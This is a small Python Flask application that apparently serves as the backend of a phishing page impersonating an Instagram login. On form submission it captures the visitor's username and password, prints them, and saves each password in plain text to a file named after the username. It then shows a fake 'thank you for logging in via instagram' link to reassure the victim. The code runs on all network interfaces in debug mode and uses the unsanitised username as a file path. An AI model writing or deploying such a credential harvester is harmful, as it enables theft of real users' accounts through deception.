from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(username,password)
        with open(f"{username}.txt", "w") as f:
            f.write(password)
        return "<a href='https://www.instagram.com/'>Thank you for logging in via instagram. Click here to redirect to your account.</a>"
    return render_template("index.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8234)
